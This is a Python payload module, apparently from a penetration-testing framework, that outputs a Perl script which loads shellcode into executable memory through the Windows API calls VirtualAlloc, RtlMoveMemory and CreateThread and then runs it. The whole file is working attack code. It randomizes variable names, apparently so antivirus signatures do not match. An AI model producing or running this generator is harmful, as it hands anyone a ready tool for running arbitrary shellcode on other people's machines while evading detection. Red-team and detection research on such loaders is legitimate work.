"""

Custom-written perl inline shellcode injector.

Approach by @the_grayhound and @christruncer

Module built by @the_grayhound

"""

from modules.common import helpers
from modules.common import shellcode


class Payload:

    def __init__(self):
        # required options
        self.shortname = "VirtualAlloc"
        self.language = "perl"
        self.extension = "pl"
        self.rating = "Excellent"
        self.description = "VirtualAlloc pattern for shellcode injection"
        # optional
        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.shellcode = shellcode.Shellcode()

    def generate(self):

        shellcode = self.shellcode.generate()

        # randomly generate out variable names
        payloadName = helpers.randomString()
        ptrName = helpers.randomString()

        payloadCode = "use Win32::API;\n"

        payloadCode += "my $%s = \"%s\";\n" % (payloadName, shellcode)

        payloadCode += "$VirtualAlloc = new Win32::API('kernel32', 'VirtualAlloc', 'IIII', 'I');\n"
        payloadCode += "$RtlMoveMemory = new Win32::API('kernel32', 'RtlMoveMemory', 'IPI', 'V');\n"
        payloadCode += "$CreateThread = new Win32::API('kernel32', 'CreateThread', 'IIIIIP', 'I');\n"
        payloadCode += "$WaitForSingleObject = new Win32::API('kernel32', 'WaitForSingleObject', 'II', 'I');\n"

        payloadCode += "my $%s = $VirtualAlloc->Call(0, length($%s), 0x1000, 0x40);\n" % (ptrName, payloadName)
        payloadCode += "$RtlMoveMemory->Call($%s, $%s, length($%s));\n" % (ptrName, payloadName, payloadName )
        payloadCode += "my $threadName = $CreateThread->Call(0, 0, $%s, 0, 0, 0);\n" % (ptrName)
        payloadCode += "$WaitForSingleObject->Call($threadName, -1);\n"

        return payloadCode
